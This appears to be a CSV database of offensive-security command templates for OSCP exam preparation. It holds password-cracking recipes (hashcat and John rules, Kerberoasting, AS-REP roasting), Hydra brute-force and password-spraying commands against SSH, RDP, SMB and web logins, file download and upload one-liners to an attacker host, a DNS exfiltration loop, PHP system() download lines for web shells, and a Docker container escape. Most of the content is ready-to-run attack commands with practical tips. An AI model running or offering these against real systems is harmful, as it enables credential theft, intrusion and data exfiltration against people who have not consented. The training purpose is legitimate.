"ps-get-current-domain","PowerShell Get Current Domain Information","ENUMERATION","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","Retrieve current Active Directory domain information using .NET System.DirectoryServices.ActiveDirectory","ACTIVE_DIRECTORY","",""
"rule-append-digit","Append Single Digit Rule","enumeration","echo '$[0-9]' > <RULE_FILE>","Create rule to append digits 0-9 to passwords","","OSCP TIP:
Rule syntax - $ (append), ^ (prepend), c (capitalize), r (reverse), d (duplicate), t (toggle case).

Combine operators:
c $1 (Capitalize + append 1) → password → Password1.

Test rules:
john --wordlist=words.txt --rules --stdout > mutated.txt.

Each operator creates separate mutations - 1 word with 10 $[0-9] rules = 10 passwords.","high"
"rule-prepend-year","Prepend Year Rule","enumeration","echo '^2 ^0 ^2 ^4' > <RULE_FILE>","Create rule to prepend year (e.g., 2024) to passwords","","OSCP TIP:
Prepend operators stack right-to-left.

For 2024:
^4 adds '4' first, ^2 adds '2' before it (24), ^0 adds '0' (024), final ^2 adds '2' (2024).

Alternative years:
2023 = ^3 ^2 ^0 ^2, 2025 = ^5 ^2 ^0 ^2.

Combine with other rules:
^2 ^0 ^2 ^4 c (Prepend 2024 AND capitalize) → password → 2024Password.

Common corporate pattern:
YYYYpassword! or password!YYYY.","high"
"rule-capitalize-append","Capitalize + Append Special Char Rule","enumeration","echo 'c $!' > <RULE_FILE>","Create rule to capitalize first letter and append exclamation mark","","OSCP TIP:
Multi-operator rules combine effects.

c $! transforms 'password' → 'Password!'.

Common corporate password policy:
8+ chars, 1 uppercase, 1 special char.

Users modify existing passwords minimally:
password → Password!, welcome → Welcome!, spring2024 → Spring2024!.

Test multiple special chars:
c $!, c $@, c $#, c $$.

Priority testing order:
! @ # $ % (most to least common).","high"
"rule-leet-speak","Leet Speak (1337) Substitution Rule","enumeration","echo -e 'sa@\nse3\nsi1\nso0\nss$' > <RULE_FILE>","Create rule to substitute common leet speak characters","","OSCP TIP:
Leet speak remains surprisingly common.

'password' with leet rules → p@ssw0rd, p@ssword, passw0rd, etc.

Users think it increases security (it doesn't significantly - just increases keyspace slightly).

Full leet transform:
password → p@55w0rd.

Test incrementally:
single substitutions first (faster), then combinations.

Hashcat has built-in toggles for common substitutions.

John rule syntax identical to Hashcat for basic s/^/$ operators.","medium"
"rule-duplicate-word","Duplicate Word Rule","enumeration","echo 'd' > <RULE_FILE>","Create rule to duplicate entire word","","OSCP TIP:
Duplication common when minimum length > typical word length.

Corporate policies often require 12-16 chars - users duplicate short passwords.

Combine with other rules:
d $! (duplicate + append !) → password → passwordpassword!.

Also test:
d $1 $2 $3 (duplicate + append digits).

Similar patterns:
word + reversed word (password + drowssap = rule:
d r).","medium"
"hashcat-test-rules","Test Hashcat Rules with Stdout","enumeration","hashcat <WORDLIST> -r <RULE_FILE> --stdout | head -20","Preview rule mutations without cracking","","OSCP TIP:
ALWAYS test rules before cracking.

Bad rule syntax = wasted time (hours/days of cracking with 0 results).

Testing workflow:
1) Create small test wordlist (10 words), 2) Run with --stdout, 3) Verify mutations match intent, 4) Run full crack.

Example:
echo 'password' | hashcat -r best64.rule --stdout (shows all 64 mutations of 'password').

Count mutations:
hashcat wordlist.txt -r rule.rule --stdout | wc -l","high"
"john-test-rules","Test John Rules with Stdout","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> --stdout | head -20","Preview John the Ripper rule mutations","","OSCP TIP:
John rules more complex than Hashcat (support conditionals, variables, multiple operations per line).

Test before using.

Common rulesets:
Wordlist (1600+ rules - aggressive), Single (smaller, username-based), KoreLogic (popular, balanced).

Show available rules:
john --list=rules.

Example:
echo 'password' | john --stdin --rules=Wordlist --stdout | head -100 (first 100 mutations).

Rule syntax differences:
John uses [] for character classes, Hashcat uses literal notation.","high"
"hashcat-best64-rules","Hashcat Best64 Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force","Apply proven 64-rule set optimized for common password patterns","","OSCP TIP:
Rule priority for time-constrained scenarios (exams):
1) Straight wordlist (no rules), 2) best64.rule (fast, proven), 3) rockyou-30000.rule (aggressive but slower), 4) dive.rule (most comprehensive).

Best64 with rockyou.txt:
14M words * 64 rules = 896M candidates (few minutes on GPU).

Success rate:
30-50% on weak passwords.

Faster than brute-force, smarter than straight wordlist.

Alternative:
John's Wordlist ruleset (1600+ rules, more aggressive) - john --wordlist=<WORDLIST> --rules=Wordlist <HASH_FILE>","high"
"hashcat-rockyou-rules","Hashcat RockYou-30000 Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/rockyou-30000.rule --force","Apply comprehensive 30,000-rule set for aggressive mutation","","OSCP TIP:
Use when:
1) Fast rules (best64) failed, 2) Hash type is fast (MD5, NTLM - millions of H/s), 3) You have time (not during exam pressure).

AVOID for slow hashes (bcrypt, KeePass - hundreds of H/s) unless desperate.

Time estimate:
NTLM on GPU = few hours, bcrypt = weeks.

Alternative approach:
Use smaller custom ruleset targeting observed password policy (if known).","medium"
"hashcat-dive-rules","Hashcat Dive Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/dive.rule --force","Apply dive.rule (comprehensive ruleset for thorough cracking)","","OSCP TIP:
Dive.rule is overkill for 99% of OSCP scenarios.

Time investment rarely justified in 24-hour exam.

Better strategy:
Focus on intelligence gathering (find password policy, leaked credentials, default passwords).

Use dive.rule for offline practice when learning password behavior.

Practical usage:
Small custom wordlist (10-100 words) + dive.rule = manageable.

rockyou.txt + dive.rule = exam time wasted.","low"
"john-custom-rules-conf","Add Custom Rules to john.conf","enumeration","echo -e '[List.Rules:Custom]\nc $1\nc $2\nc $3' >> ~/.john/john.conf","Create custom rule set in John configuration","","OSCP TIP:
Custom rules allow targeted attacks based on discovered password policy.

Example:
Policy requires uppercase, digit, special char → Create rules:
c $1 $!, c $2 $@, c $3 $#.

Rule syntax same as Hashcat for basic operations (s, ^, $, c, d, r, t).

John also supports advanced features:
conditionals (>[1-9] = reject if length < N), character position operations, context-sensitive mutations.

View all built-in rules:
john --list=rules (shows Wordlist, Single, etc.).","medium"
"create-policy-rules","Generate Rules from Password Policy","enumeration","echo -e 'c $<YEAR> $!\nc $<YEAR> $@\nc $<YEAR> $#' > <RULE_FILE>","Create rules matching discovered password policy requirements","","OSCP TIP:
Intelligence-driven rule creation.

Scenario:
Discovered policy via error message ('Password must contain:
1 uppercase, 1 digit, 1 special char, min 12 characters').

Create targeted rules:
c $2 $0 $2 $4 $! (Capitalize + 2024 + ! = 'Password2024!', 12 chars).

Also test:
Season + Year patterns (Spring2024!, Summer2024!).

Combine with company-specific wordlist (company name, products, locations).

100-word targeted list + smart rules > 14M-word generic list.","high"
"hashcat-benchmark","Hashcat Benchmark Hash Rates","enumeration","hashcat -b","Benchmark all hash algorithms to determine cracking speed","","OSCP TIP:
Run benchmark BEFORE exam to understand your hardware capabilities.

Calculate cracking time = keyspace / hash_rate.

Example:
MD5 @ 68,000 MH/s vs SHA256 @ 9,000 MH/s.

GPU benchmark requires GPU passthrough in VM or physical machine.

VM without GPU will use CPU (much slower).","medium"
"hashcat-md5-crack","Crack MD5 Hash (Mode 0)","enumeration","hashcat -m 0 <HASH_FILE> <WORDLIST> --force","Crack MD5 hashes using dictionary attack","","OSCP TIP:
MD5 is FAST (68,000 MH/s on GPU = 68 billion hashes/second).

8-char password with full charset = 6.5 hours.

Always try straight dictionary attack before rules.

Remove 'username:' prefix from hash file unless using --username flag.

Verify mode matches hash type.","high"
"hashcat-sha256-crack","Crack SHA256 Hash (Mode 1400)","enumeration","hashcat -m 1400 <HASH_FILE> <WORDLIST> --force","Crack SHA-256 hashes using dictionary attack","","SHA-256 hash length:
64 characters.

Example:
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6 = 'secret1'.

Slower than MD5 but still GPU-friendly.","high"
"hashcat-ntlm-crack","Crack NTLM Hash (Mode 1000)","enumeration","hashcat -m 1000 <HASH_FILE> <WORDLIST> --force","Crack Windows NTLM hashes","","OSCP TIP:
NTLM hashes from Windows SAM, memory dumps, or SMBv1/v2 captures.

EXTREMELY fast cracking (no salt).

Common in Windows domain environments.

Extract with:
mimikatz, secretsdump.py, reg save HKLM\SAM sam.save","high"
"hashcat-rule-attack","Hashcat Rule-Based Attack","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Apply mutation rules to wordlist passwords","","OSCP TIP:
Rule-based attacks crack passwords that don't exist in wordlist.

Password policies require complexity = users modify base words (Password → Password123!).

Best rules for OSCP:
best64.rule (fast testing), rockyou-30000.rule (designed for rockyou.txt).

Dramatically increases keyspace (14M passwords × 30,000 rules = 420B attempts).

Monitor with --status to track progress.","high"
"hashcat-keepass-crack","Crack KeePass Database (Mode 13400)","enumeration","hashcat -m 13400 <KEEPASS_HASH> <WORDLIST> -r <RULE_FILE> --force","Crack KeePass master password","","OSCP TIP:
KeePass databases found in user Documents, Desktop, or network shares.

Extract hash with keepass2john Database.kdbx > keepass.hash.

Remove 'Database:' prefix.

KeePass uses strong KDF (slow hashing) - cracking takes longer than simple hashes.

Focus on targeted wordlists based on user password patterns.

Common user behavior:
reuse password fragments with policy modifications (Password1! → Password123!).","high"
"hashcat-ssh-key-crack","Crack SSH Private Key Passphrase (Mode 22921)","enumeration","hashcat -m 22921 <SSH_HASH> <WORDLIST> -r <RULE_FILE> --force","Crack SSH private key passphrase (aes-256-cbc cipher)","","OSCP TIP:
SSH private keys found in ~/.ssh/id_rsa, web server file disclosure vulnerabilities, or backup files.

Extract hash with ssh2john id_rsa > ssh.hash.

Remove 'id_rsa:' prefix.

Check hash for cipher type:
$6$ = aes-256-cbc (Hashcat OK), others may require JtR.

Modern keys often use aes-256-ctr (JtR required).

Build custom wordlists from user information (names, dates, common words found in notes.txt).","medium"
"hashcat-combination-attack","Hashcat Combination Attack","enumeration","hashcat -m <MODE> -a 1 <HASH_FILE> <WORDLIST1> <WORDLIST2> --force","Combine words from two wordlists (word1+word2)","","Combination attack for compound passwords.

Example:
First names + Last names, Words + Years, Common prefixes + Common words.

Keyspace explodes quickly (1000 × 1000 = 1M passwords).

Consider using small focused lists.","medium"
"hashcat-mask-attack","Hashcat Mask Attack (Brute-Force Pattern)","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> <MASK> --force","Brute-force attack using character mask pattern","","Use mask attacks when password policy is known.

Example:
'Must start with capital, end with number and special char, 8 chars min' → ?u?l?l?l?l?d?d?s.

WARNING:
Brute-force is SLOW.

8-char full charset (?a?a?a?a?a?a?a?a) = years on CPU.

Only use for short passwords or constrained charsets.","low"
"hashcat-hybrid-attack","Hashcat Hybrid Attack (Wordlist + Mask)","enumeration","hashcat -m <MODE> -a 6 <HASH_FILE> <WORDLIST> <MASK> --force","Append mask pattern to wordlist words","","Hybrid attacks for common password patterns:
base_word + digits + special.

Example:
rockyou.txt + ?d?d?s (2 digits + 1 special) = Password12!, Welcome99#, etc.

More efficient than full rule-based attack for this specific pattern.","medium"
"hashcat-show-cracked","Show Cracked Passwords","enumeration","hashcat -m <MODE> <HASH_FILE> --show","Display previously cracked passwords from potfile","","OSCP TIP:
Hashcat saves ALL cracked passwords to ~/.hashcat/hashcat.potfile permanently.

Use --show to retrieve results.

Critical for documentation - always run --show after successful crack to capture passwords for report.

Potfile persists across sessions.","high"
"hashcat-output-format","Hashcat Output Format Control","enumeration","hashcat -m <MODE> <HASH_FILE> --show --outfile-format=2","Control output format for cracked passwords","","Output formats:
2=password only (scripting), 5=hash:password (documentation).

Default format 5 is best for OSCP reporting.","medium"
"hashcat-status-timer","Hashcat Auto-Status Updates","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --status --status-timer=10","Display progress status every N seconds","","OSCP TIP:
Use --status --status-timer=30 for long attacks (rule-based, large wordlists).

Provides ETA for completion.

Critical for time management in exam - know when to abandon attack if ETA exceeds available time.","medium"
"hashcat-increment","Hashcat Increment Mode (Progressive Length)","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> ?a?a?a?a?a?a --increment --increment-min=<MIN> --increment-max=<MAX> --force","Brute-force with incrementing password length","","Increment mode for brute-force when password length is unknown but constrained (policy:
4-12 chars).

WARNING:
Still extremely slow.

8-char full charset = years.

Only viable for fast hashes (MD5, NTLM) and short passwords (≤6 chars).","low"
"hashcat-potfile-disable","Hashcat Disable Potfile","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --potfile-disable --force","Disable automatic saving of cracked hashes","","Rarely needed - potfile is BENEFICIAL for OSCP (persistent results, no re-cracking same hashes).

Only disable for testing or privacy.

Always use --outfile if potfile disabled.","low"
"hashcat-username-format","Hashcat Username:Hash Format","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --username --force","Handle hash files with username:hash format","","OSCP TIP:
secretsdump.py, mimikatz, and SAM dumps often output username:hash format.

Use --username flag to preserve username-password mapping for documentation.

Output format:
user:hash:password (critical for privilege escalation reporting).","medium"
"hashcat-custom-charset","Hashcat Custom Character Set","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> -1 <CHARSET> <MASK> --force","Define custom character set for mask attack","","Custom charsets for constrained brute-force.

Example:
Hex passwords → -1 '0123456789abcdef' ?1?1?1?1?1?1.

Reduces keyspace dramatically (16^6 vs 95^6 for 6-char).","low"
"hashcat-bcrypt-crack","Crack bcrypt Hash (Mode 3200)","enumeration","hashcat -m 3200 <HASH_FILE> <WORDLIST> --force","Crack bcrypt hashes (SLOW algorithm)","","OSCP WARNING:
bcrypt cracking is VERY SLOW (1000-10000 passwords/second vs billions for MD5).

14M rockyou.txt = 23-233 hours for straight dictionary.

NOT viable for exam time constraints unless:
1) Small focused wordlist 2) Password reuse suspected 3) No other attack vectors.

Focus on other vulnerabilities first.","medium"
"hashcat-debug-mode","Hashcat Debug Mode (Test Rules)","enumeration","hashcat <WORDLIST> -r <RULE_FILE> --stdout","Test rule mutations without cracking (debug mode)","","OSCP TIP:
Always test custom rules with --stdout before running full crack.

Verify mutations match expected password policy.

Example:
echo 'password' | hashcat -r rules --stdout (test single word).

Saves time vs discovering rule errors mid-crack.","medium"
"hashcat-optimized-kernel","Hashcat Optimized Kernel","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -O --force","Use optimized kernel for speed boost (password length ≤31)","","Speed boost (~2x) but limits password length to 31 chars.

Safe for most real-world passwords (policies rarely allow >31).

Check password policy before using.","medium"
"hashcat-crack-asrep","Crack Kerberos AS-REP Hash (Mode 18200)","enumeration","hashcat -m 18200 <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Crack Kerberos AS-REP hashes (AS-REP Roasting attack)","","AS-REP ROASTING HASH CRACKING for users with Kerberos preauthentication disabled.

HASH SOURCE:
impacket-GetNPUsers (Linux) or Rubeus asreproast (Windows).

HASH FORMAT CRITICAL:
Must be SINGLE LINE.

Rubeus without /nowrap flag produces MULTI-LINE hashes that Hashcat rejects.

Always use /nowrap.

HASH MODE IDENTIFICATION:
hashcat --help | grep -i 'Kerberos' | grep 'AS-REP' shows mode 18200.

CRACKING SPEED:
RC4-HMAC (etype 23) is FAST.

GPU:
~500 MH/s (rockyou.txt straight = <1 second).

CPU (Kali VM):
~500 KH/s (rockyou.txt straight = ~30 seconds).

RULE-BASED ATTACK:
hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force adds 77 mutations per password (Password → Password1, Password!, Password123, etc.).

TIME ESTIMATE:
Straight dictionary (14M passwords) = <1 min on CPU, <1 sec on GPU.

Rule-based (14M × 77 = 1B+ combinations) = 5-30 min on CPU, 1-5 min on GPU.

OSCP TIP:
Try straight dictionary FIRST (fastest).

If fails, add best64.rule.

If still fails, try rockyou-30000.rule (30K mutations, much slower but thorough).

Weak passwords (Password1!, Welcome2023!) crack in <5 min.

MONITORING:
Press 's' key for status.

--status --status-timer=30 for automatic updates every 30 seconds.

RESULT STORAGE:
Cracked passwords automatically saved to ~/.hashcat/hashcat.potfile.

View with:
hashcat -m 18200 hashes.asreproast --show.

ALTERNATIVE HASH FORMAT:
John the Ripper format also supported by some tools but Hashcat uses different mode.

Stick with Hashcat format from impacket/Rubeus.

OSCP EXAM:
AS-REP roasting is QUICK WIN if vulnerable users exist (rare but possible).

Total time:
30 sec enumeration + 1-30 min cracking = potential domain credentials in <30 minutes.","high"
"hashcat-crack-tgsrep","Crack Kerberos TGS-REP Hash (Mode 13100)","enumeration","hashcat -m 13100 <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Crack Kerberos TGS-REP hashes (Kerberoasting attack)","","KERBEROASTING HASH CRACKING for service account SPNs.

HASH SOURCE:
impacket-GetUserSPNs (Linux) or Rubeus kerberoast (Windows).

TARGET ACCOUNTS:
User accounts with servicePrincipalName attribute (sql_service, iis_service, svc_backup, etc.).

UNCRACKABLE ACCOUNTS:
Computer accounts (ending in $) and Managed Service Accounts have 120-character RANDOM passwords - DO NOT ATTEMPT TO CRACK.

Filter these out before cracking.

HASH FORMAT:
$krb5tgs$23$ = RC4-HMAC (etype 23).

$krb5tgs$17$ or $krb5tgs$18$ = AES256 or AES128 (slower).

RC4 VS AES:
RC4 cracking ~10x faster than AES.

Use Rubeus /tgtdeleg flag to force RC4 downgrade on AES-enabled accounts.

CRACKING SPEED:
RC4 hash rate similar to NTLM (very fast).

GPU:
~500 MH/s.

CPU:
~500 KH/s.

SERVICE ACCOUNT PASSWORD PATTERNS:
Often follow conventions:
(1) ServiceName + number (SQL → MSSQLService123!).

(2) Company + service (Acme → AcmeSQL2019!).

(3) Generic weak (Password1!, ServiceAccount123!).

(4) Unchanged for YEARS (service accounts rarely rotated).

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY:
hashcat -m 13100 hashes.kerberoast rockyou.txt --force (fast, try first).

(2) RULE-BASED:
Add best64.rule for common mutations (5-30 min).

(3) TARGETED:
Create custom wordlist from:
Company name (Acme), Service type (SQL, IIS, Backup), Common patterns (Service123!, ServiceAccount2019!).

(4) COMPREHENSIVE:
Use rockyou-30000.rule for thorough attack (hours but higher success rate).

TIME ESTIMATE:
Weak password (dict word + number) = 5-30 min with rules.

Medium password (10 random chars) = hours to days.

Strong password (12+ random) = infeasible.

OSCP SUCCESS RATE:
HIGH - 60-80% of corporate domains have Kerberoastable accounts with weak passwords.

Service accounts often neglected (set once, never changed, weak password chosen for 'memorability').

MONITORING:
--status --status-timer=30 for progress updates.

RESULT EXTRACTION:
hashcat -m 13100 hashes.kerberoast --show displays cracked passwords.

--outfile-format=2 for passwords only, =5 for hash:password pairs.

OSCP EXAM:
Kerberoasting is HIGH-PRIORITY attack.

Total time:
10 sec SPN enum + 10 sec TGS request + 5-120 min cracking.

Often leads to:
(1) Service account with Domain Admin privileges (immediate win).

(2) Local admin on servers (lateral movement).

(3) High-privilege service account (privilege escalation opportunities).

CRITICAL WARNING:
If all SPNs are on computer accounts (names ending in $), hashes are UNCRACKABLE.

Document finding and proceed to alternative attacks (AS-REP roasting, password spraying, local privilege escalation).","high"
"hydra-ssh-single-user","SSH Dictionary Attack - Single User","enumeration","hydra -l <USERNAME> -P <WORDLIST> -s <PORT> ssh://<TARGET>","Dictionary attack against SSH service for single user","","OSCP TIP:
Dictionary attacks generate significant noise (logs, IDS alerts).

Always verify target doesn't have account lockout policies before running.

Test with small wordlist first (100 passwords).

Time estimate:
14M passwords @ 16 tasks/second = ~14 hours for rockyou.txt on typical lab connection.

Use filtered wordlists or rule-based mutations for efficiency.

Default accounts (root, admin, administrator) are high-value targets.","high"
"hydra-ssh-user-list","SSH Dictionary Attack - User List","enumeration","hydra -L <USERLIST> -P <WORDLIST> -s <PORT> ssh://<TARGET>","Dictionary attack against SSH with multiple usernames","","WARNING:
This attack can trigger account lockouts if multiple users have lockout policies.

Keyspace = userlist_size × wordlist_size.

With 100 users and 14M passwords = 1.4B attempts.

Consider using focused wordlists or password spraying instead.","medium"
"hydra-rdp-spray","RDP Password Spraying","enumeration","hydra -L <USERLIST> -p ""<PASSWORD>"" rdp://<TARGET>","Password spraying attack against RDP service","","OSCP TIP:
Password spraying is stealthier than dictionary attacks (fewer attempts per user, less likely to trigger lockouts).

Common spray passwords:
Company name + year + !, Season + year + !, Password123!, Welcome123!.

RDP default port 3389 is often exposed on Windows servers.

Time estimate:
~15 minutes for 8,000 users with 1 password.","high"
"hydra-http-post-form","HTTP POST Login Form Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> <TARGET> http-post-form ""<LOGIN_PAGE>:<POST_DATA>:<FAIL_STRING>""","Dictionary attack against HTTP POST login forms","","OSCP TIP:
1) Use Burp to intercept login attempt - get POST data 2) Try failed login in browser - get failure message 3) Shorten failure string (avoid words like 'password' or 'username') 4) Default web users:
admin, administrator, user, root, test.

Time estimate:
14M passwords @ ~10-20 attempts/second = 16-32 hours (slow due to HTTP overhead).

Use filtered wordlists.

Web Application Firewalls (WAFs) will block this quickly - may not be viable if WAF present.","high"
"hydra-ftp-attack","FTP Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> ftp://<TARGET>","Dictionary attack against FTP service","","Check anonymous FTP first:
ftp <TARGET>, username 'anonymous', password blank or email.

FTP cleartext = fast authentication = faster than HTTP/RDP.

Default users:
ftp, anonymous, admin, root.","medium"
"hydra-smb-attack","SMB Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> smb://<TARGET>","Dictionary attack against SMB/CIFS service","","OSCP TIP:
Windows default accounts - Administrator, Guest (usually disabled), service accounts.

SMB lockout policies are STRICT - be very careful.

Test with 5-10 passwords first.

Prefer password spraying over dictionary attack on SMB.","high"
"hydra-mysql-attack","MySQL Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> mysql://<TARGET>","Dictionary attack against MySQL database","","Default MySQL users:
root (no password on some installs), admin, user.

Port 3306 rarely exposed externally but common internally.

Successful auth = database access = potential data exfiltration or privilege escalation.","medium"
"hydra-verbose","Hydra Verbose Output","enumeration","hydra -l <USERNAME> -P <WORDLIST> -V <PROTOCOL>://<TARGET>","Run Hydra with verbose output showing every attempt","","Use for troubleshooting only.

Output is overwhelming with large wordlists.

Alternative:
-v (lowercase) shows found passwords without showing every attempt.","low"
"hydra-custom-port","Hydra Custom Port","enumeration","hydra -l <USERNAME> -P <WORDLIST> -s <PORT> <PROTOCOL>://<TARGET>","Attack service on non-standard port","","Always check nmap results for non-standard ports.

Examples:
SSH on 2222, HTTP on 8080, RDP on 3390, MySQL on 13306.","medium"
"hydra-parallel-tasks","Hydra Parallel Tasks Configuration","enumeration","hydra -l <USERNAME> -P <WORDLIST> -t <TASKS> <PROTOCOL>://<TARGET>","Configure number of parallel connections","","OSCP TIP:
Default -t 16 is aggressive - may trigger lockouts or 'too many authentication failures' on SSH.

Conservative approach:
-t 4 for SSH, -t 8 for HTTP, -t 16 for FTP (fast protocol).

Always test with small wordlist first.","medium"
"hydra-wait-time","Hydra Wait Time Between Attempts","enumeration","hydra -l <USERNAME> -P <WORDLIST> -t <TASKS> -w <SECONDS> <PROTOCOL>://<TARGET>","Add delay between connection attempts to avoid detection/lockout","","Stealth option - significantly slows attack.

Example:
1000 passwords × 5 seconds = 83 minutes.

Only use when absolutely necessary (strict lockout, IDS alerts, exam restriction).

Not typically needed in OSCP labs.","low"
"hydra-resume-session","Hydra Resume Session","enumeration","hydra -l <USERNAME> -P <WORDLIST> -R <PROTOCOL>://<TARGET>","Resume previously aborted/crashed Hydra session","","Hydra creates hydra.restore file automatically.

Resume with -R flag.

All original parameters must match.

Useful for multi-hour attacks that get interrupted.","low"
"hydra-show-attempts","Hydra Show Attempt Progress","enumeration","hydra -l <USERNAME> -P <WORDLIST> -v <PROTOCOL>://<TARGET>","Show found credentials without verbose attempt output","","Lowercase -v is recommended (shows progress without spam).

Uppercase -V shows every attempt (too noisy).

Default (no flag) only shows final results.","medium"
"hydra-output-file","Hydra Save Output to File","enumeration","hydra -l <USERNAME> -P <WORDLIST> -o <OUTPUT_FILE> <PROTOCOL>://<TARGET>","Save found credentials to file for documentation","","OSCP REQUIREMENT:
Document all found credentials with source/method.

-o flag creates audit trail.

Always use for exam/professional work.","medium"
"hydra-combo-attack","Hydra Credential Pair Attack","enumeration","hydra -C <CREDENTIAL_FILE> <PROTOCOL>://<TARGET>","Test credential pairs from file (username:password format)","","Use for default credential testing or credential stuffing.

Common default pairs:
admin:admin, root:root, administrator:password, user:user.

SecLists has good default credential lists.","medium"
"python-http-server","Python HTTP Server","post-exploit","python3 -m http.server <PORT>","Start simple HTTP server for file transfers","general-transfer","Serves files from current directory","high"
"wget-download","Wget Download","post-exploit","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget","general-transfer","Available on most Linux systems","high"
"curl-upload","Curl File Upload","post-exploit","curl -X POST -F 'file=@<FILE>' http://<LHOST>:<PORT>/upload","Upload file using curl","general-transfer","Requires upload handler on server","high"
"certutil-download","Certutil Windows Download","post-exploit","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download files on Windows using certutil","general-transfer","Built into Windows, often not blocked","high"
"powershell-download","PowerShell Download Methods","post-exploit","powershell -c ""Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>""","Download files using PowerShell","general-transfer","IWR alias for Invoke-WebRequest","high"
"smb-server","Impacket SMB Server","post-exploit","impacket-smbserver share . -smb2support","Start SMB server for file transfers","general-transfer","No authentication by default","high"
"nc-file-transfer","Netcat File Transfer","post-exploit","nc -l -p <LPORT> > <FILE>","Receive file using netcat","general-transfer","Simple but no progress indication","high"
"rdesktop-disk-share","RDesktop Disk Sharing","post-exploit","rdesktop -u <USERNAME> -p <PASSWORD> -r disk:share=<LOCAL_PATH> <TARGET>:<PORT>","Mount local directory in Windows RDP session for bidirectional file transfer","general-transfer","Share name 'share' becomes \\tsclient\share in Windows.

Port defaults to 3389 if omitted from command.","high"
"base64-transfer","Base64 Encoding Transfer","post-exploit","base64 -w0 <FILE> | nc <LHOST> <LPORT>","Transfer files using base64 encoding","general-transfer","Useful for binary files over text protocols","high"
"ftp-transfer","FTP File Transfer","post-exploit","python3 -m pyftpdlib -p <PORT> -w","Start FTP server for file transfers","general-transfer","Install: pip install pyftpdlib","medium"
"scp-transfer","SCP Secure Copy","post-exploit","scp <FILE> <USERNAME>@<TARGET>:/tmp/","Secure copy over SSH","general-transfer","Requires SSH credentials","medium"
"php-download","PHP Download Script","post-exploit","<?php file_put_contents('<FILE>', file_get_contents('http://<LHOST>:<PORT>/<FILE>')); ?>","Download file using PHP","general-transfer","Works in web shells","high"
"perl-download","Perl Download","post-exploit","perl -e 'use LWP::Simple; getstore(""http://<LHOST>:<PORT>/<FILE>"", ""<OUTPUT>"");'","Download file using Perl","general-transfer","LWP module may not be installed","medium"
"vbscript-download","VBScript Download (Windows)","post-exploit","echo Set x=CreateObject(""Microsoft.XMLHTTP""):x.Open ""GET"",""http://<LHOST>:<PORT>/<FILE>"",0:x.Send:Set s=CreateObject(""ADODB.Stream""):s.Type=1:s.Open:s.Write x.ResponseBody:s.SaveToFile ""<OUTPUT>"",2 > dl.vbs && cscript //nologo dl.vbs","Download file using VBScript on older Windows","general-transfer","Works on Windows XP/2003","medium"
"debug-exe-transfer","Debug.exe File Creation (Windows)","post-exploit","upx -9 <FILE> && exe2hex -x <FILE> -p <FILE>.cmd","Convert binary to debug.exe script for Windows XP/2003","general-transfer","Limited to 64KB files","low"
"dns-exfiltration","DNS Exfiltration","post-exploit","cat <FILE> | xxd -p | while read line; do nslookup $line.<DOMAIN>; done","Exfiltrate data via DNS queries","general-transfer","Slow but stealthy","low"
"cat-etc-group","Cat Etc Group","post-exploit","cat /etc/group | grep docker","Privilege escalation technique via cat","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high"
"stat-var-run","Stat Var Run","post-exploit","stat /var/run/docker.sock","Privilege escalation technique via stat","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high"
"docker-run-pid","Docker Nsenter Container Escape","post-exploit","docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh","Escape Docker container to host system via nsenter by accessing host PID namespace","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high"
"cat-mnt-etc","Cat Mnt Etc","post-exploit","cat /mnt/etc/passwd","Execute cat for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high"
"docker-run-pid-2","Docker Nsenter Container Escape","post-exploit","docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh","Escape Docker container to host system via nsenter by accessing host PID namespace","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high"
"curl-t-file","Curl T File","post-exploit","curl -T <FILE> ftp://<LHOST>/","Transfer files using curl","data-exfiltration","Auto-generated from full syntax text.

Source:
general-transfer.json","medium"
"python-m-simplehttpserver","Python Simple HTTP Server","post-exploit","python -m SimpleHTTPServer","Start Python 2 HTTP server for file hosting and transfers","data-exfiltration","Auto-generated from full syntax text.

Source:
general-transfer.json","medium"
"wget-via-php","Wget Via Php","post-exploit","wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>","Transfer files using wget","data-exfiltration","Auto-generated from full syntax text.

Source:
general-transfer.json","medium"
"curl-via-php","Curl Via Php","post-exploit","curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>","Transfer files using curl","data-exfiltration","Auto-generated from full syntax text.

Source:
general-transfer.json","medium"
